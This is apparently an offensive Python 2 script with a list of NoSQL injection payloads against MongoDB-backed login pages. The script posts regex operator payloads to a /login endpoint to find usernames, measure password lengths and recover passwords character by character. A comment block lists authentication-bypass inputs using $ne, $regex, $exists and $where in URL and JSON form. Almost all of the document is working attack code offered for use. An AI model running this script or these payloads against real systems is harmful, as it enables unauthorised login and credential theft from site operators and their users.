
##
## https://x3tb3t.github.io/2017/05/15/NodeJS-and-MongoDB-NoSQL-Injection/
##


#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import os
import requests
import timeit
from itertools import product
from string import ascii_lowercase

users = ["admin", "Admin", "root", "r00t", "administrator", "Administrator", "administrateur", "Administrateur", "user", "User"]
patterns = []
creds = {}
ucreds = {}
host = raw_input("host : ")
port = raw_input("port : ")
repeatchar = raw_input("Repeat ascii bruteforce (ex: 3) : ")
url = "http://" + host + ":" + port + "/login"
start_time = timeit.default_timer()

def view():
	print "NoSQL injection\n==============="
	elapsed = timeit.default_timer() - start_time
	m, s = divmod(elapsed, 60)
	h, m = divmod(m, 60)
	print str(len(ucreds)) + " unique passwords dumped in %d:%02d:%02d\n" % (h, m, s)
	print "%-*s %s" % (25,"Password :","Regex patterns :")
	for k, v in creds.iteritems():
		print "%-*s %s" % (25,v,k)
		
# Add usernames from users
for user in users:
	patterns.append(user)

# Add usernames from wordlist
#with open('usernames.txt') as f:
#    patterns += f.read().splitlines()

# Generate patterns for bruteforce
num = list(range(1000))
patterns += [str(x) for x in num]
patterns += [''.join(i) for i in product(ascii_lowercase, repeat = int(repeatchar))]
 
for pattern in patterns:
	# check if regex pattern matches a user "user[$regex]=pattern&pass[$gt]="
	req = {'user[$regex]':pattern, 'pass[$gt]':""}
	res = requests.post(url,data=req).content
		
	# if not logged, try next pattern
	if res.find(b'Administration') == -1:
		elapsed = timeit.default_timer() - start_time
		m, s = divmod(elapsed, 60)
		h, m = divmod(m, 60)
		os.system('clear')
		view()
		print "\nNo matching user for pattern : " + str(pattern)
		continue

	# if pattern matches a user then check password size
	size = 0
	while 1:
		# "user[$regex]=pattern&pass[$regex]=.{0}" ==> "user[$regex]=pattern&pass[$regex]=.{5}" 
		payload = ".{" + str(size) + "}"
		req = {'user[$regex]':pattern, 'pass[$regex]':payload}
		res = requests.post(url,data=req).content
		
		# Until logged, increment size otherwise password is size -1
		if res.find(b'Administration') == -1:
			break
		size += 1
	size -= 1
	#print "[+] The password is " + str(size) + " characters long !"


	# retrieve password
	passwd = ""
	char = 48
	length = 0

	while 1:
		# "user[$regex]=pattern&pass[$regex]=a.{5}" ==> "user[$regex]=pattern&pass[$regex]=admin.{0}" 
		pass_payload = passwd + str(chr(char)) + '.{' + str(size - len(passwd) -1) + '}'
		req = {'user[$regex]':pattern, 'pass[$regex]':pass_payload}
		res = requests.post(url, data=req).content
		
		os.system('clear')
		view()
		print "\nMatching user for pattern : " + str(pattern)
		print "Password : %s" % (pass_payload)
		
		if res.find(b'Administration') != -1:	# if logged, add char to passwd
			passwd += str(chr(char))
			char = 48
			length += 1

		if char == 90:	# jump unhandled ascii chars
			char = 96		
		if char == 57:
			char = 64
		char += 1

		if len(passwd) == size:
			creds[pattern] = passwd
			ucreds = {}
			for k, v in creds.iteritems():
				ucreds.setdefault(v, []).append(k)
			break

os.system('clear')

print "%-*s %s\n" % (30,"Password :","Regex patterns :")
for k, v in ucreds.iteritems():
	print "%-*s %s" % (30,str(k),str(v))

print "\n" + str(len(ucreds)) + " unique passwords found in %d:%02d:%02d\n" % (h, m, s)

##
##
##
## Bypass with Operator:
"""
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin$password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code

Bypass with Not Equal Operator
#in URL
username[$ne]=toto&password[$ne]=toto
username[$exists]=true&password[$exists]=true

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null} }
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"} }
{"username": {"$gt": undefined}, "password": {"$gt": undefined} }
"""
##
##
##
